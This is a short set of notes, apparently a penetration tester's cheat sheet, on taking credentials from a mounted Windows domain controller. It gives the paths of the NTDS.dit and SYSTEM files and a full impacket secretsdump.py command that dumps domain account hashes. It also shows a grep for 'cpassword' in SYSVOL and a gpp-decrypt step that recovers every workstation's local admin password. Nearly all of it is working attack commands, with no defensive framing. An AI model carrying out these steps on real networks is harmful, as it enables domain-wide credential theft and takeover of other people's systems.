domain controller exploit
(info from @TinkerSec, March 6, 2019)

*** mounted DC filesystem

grab hashes from NTDS.dit file
- found in ...\Windows\NTDS\NTDS.dit
get system hive as well
- found in ...\Windows\System32\config\SYSTEM

use impacket script, secretsdump.py, to get domain user accounts and hashes from local files:
python secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL -outputfile lol.hash

secretsdump.py is in the examples directory. There are a lot of useful scripts there

grepped SYSVOL (C:\Windows\SYSVOL\):

~/$ grep -r cpassword *

And found the cipher text for every workstations' Local Admin password. Decrypted it with:

~/$ gpp-decrypt "<cpasswordcipher>"
